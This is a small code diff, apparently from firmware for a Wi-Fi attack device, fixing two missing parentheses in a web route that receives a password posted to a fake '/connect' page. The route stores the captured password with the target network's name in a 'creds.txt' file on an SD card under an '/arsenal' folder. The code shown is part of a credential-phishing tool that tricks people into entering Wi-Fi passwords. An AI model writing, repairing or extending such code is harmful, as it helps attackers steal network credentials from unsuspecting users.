@@ -110,13 +110,13 @@ static void setupFwdRoutes(String ssid) {
 
 
     fwdServer->on("/connect", HTTP_POST, [](AsyncWebServerRequest *request) {
-        if (request->hasArg("password") {
+        if (request->hasArg("password")) {
             capturedPassword = request->arg("password");
             credsCaptured = true;
 
 
             if (setupSdCard()) {
-                if (!SD.exists("/arsenal") SD.mkdir("/arsenal");
+                if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
                 File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
                 if (f) {
                     f.printf("[CredFwd] SSID:%s PASS:%s\n", targetSSID.c_str(), capturedPassword.c_str());
